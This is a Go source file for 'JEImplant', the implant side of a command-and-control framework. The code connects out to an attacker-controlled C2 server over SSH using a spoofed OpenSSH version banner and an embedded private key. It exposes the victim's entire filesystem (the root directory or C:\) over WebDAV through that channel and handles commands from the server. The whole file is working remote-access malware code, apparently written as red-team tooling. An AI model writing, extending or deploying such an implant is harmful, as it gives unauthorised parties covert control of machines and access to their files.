// Program JEImplant is the implant side of JEC2.
package main

/*
 * jeimplant.go
 * Implant side of JEServer
 * By J. Stuart McMurray
 * Created 20220326
 * Last Modified 20220402
 */

import (
	"encoding/base64"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"

	"golang.org/x/crypto/ssh"
	"golang.org/x/net/webdav"
)

var (
	ServerAddr string
	ServerFP   string
	PrivKey    string
	SSHVersion = "SSH-2.0-OpenSSH_8.6"

	/* Signer is PrivKey, parsed. */
	Signer ssh.Signer

	// C2Conn is the connection to the C2 server.  C2ConnL should be
	// RLock'd while using it.
	C2Conn  ssh.Conn
	C2ConnL sync.RWMutex

	// WDListener is a FakeListener which hadles WebDAV connections.
	WDListener *FakeListener
)

func main() {
	flag.StringVar(
		&ServerAddr,
		"address",
		ServerAddr,
		"C2 `address`",
	)
	flag.StringVar(
		&ServerFP,
		"fingerprint",
		ServerFP,
		"C2 hostkey SHA256 `fingerprint`",
	)
	flag.StringVar(
		&SSHVersion,
		"version",
		SSHVersion,
		"SSH client version `banner`",
	)
	flag.BoolVar(
		&DoDebug,
		"debug",
		DoDebug,
		"Enable debug logging",
	)
	flag.Parse()

	/* Sanity-check some things. */
	if !strings.HasPrefix(ServerFP, "SHA256:") {
		Debugf("Server fingerprint should shart with SHA256:")
	}

	/* Parse our private key. */
	if err := ParsePrivateKey(); nil != err {
		Debugf("Unable to parse private key: %s", err)
	}
	PrivKey = "" /* It's a try, anyways. */

	/* Start a WebDAV server. */
	var wdDir = "/"
	WDListener = NewFakeListener("webdav", "internal")
	if "windows" == runtime.GOOS {
		wdDir = `C:\` /* Just enough, I guess? */
	}
	go func() {
		Logf(
			"Error serving WebDAV: %s",
			(&http.Server{
				Handler: &webdav.Handler{
					FileSystem: webdav.Dir(wdDir),
					LockSystem: webdav.NewMemLS(),
				},
				ErrorLog: NewWebDAVLogger(),
			}).Serve(WDListener),
		)
	}()

	/* Connect to the C2 server. */
	cc, chans, reqs, err := ConnectToC2()
	if nil != err {
		Debugf(
			"Error establishing connection with C2 %s: %s",
			ServerAddr,
			err,
		)
		os.Exit(7)
	}
	C2ConnL.Lock()
	C2Conn = cc
	C2ConnL.Unlock()

	go HandleC2Chans(cc, chans)
	go HandleC2Reqs(cc, reqs)

	/* Wait for the connection to die. */
	err = cc.Wait()
	switch {
	case errors.Is(err, io.EOF), nil == err:
		Debugf("Connection to C2 server closed")
		os.Exit(8)
	default:
		Debugf("Connection to C2 server closed with error: %s", err)
		os.Exit(9)
	}
}

// ParsePrivateKey parses PrivKey, which may be base64'd, and stores it in
// Signer.  This should be called only once, at initialization.
func ParsePrivateKey() error {
	var b []byte
	/* Decode the key, if needed. */
	switch {
	case strings.HasPrefix(PrivKey, "LS0tLS1CRUdJTiBP"): /* Base64 */
		var err error
		b, err = base64.StdEncoding.DecodeString(PrivKey)
		if nil != err {
			return fmt.Errorf("unbase64ing: %w", err)
		}
	case strings.HasPrefix(PrivKey, "-----BEGIN"): /* Unencoded */
		b = []byte(PrivKey)
	default: /* Unknown format. */
		start := PrivKey
		if 10 < len(start) {
			start = start[:10]
		}
		return fmt.Errorf(
			"unknown private key format starting with %q",
			start,
		)
	}

	/* SSHify it. */
	s, err := ssh.ParsePrivateKey(b)
	if nil != err {
		return fmt.Errorf("converting from PEM: %w", err)
	}

	/* Save the parsed key, with a possiblity of catching errors. */
	if nil != Signer {
		Debugf("Private key already parsed")
		os.Exit(5)
	}
	Signer = s

	return nil
}
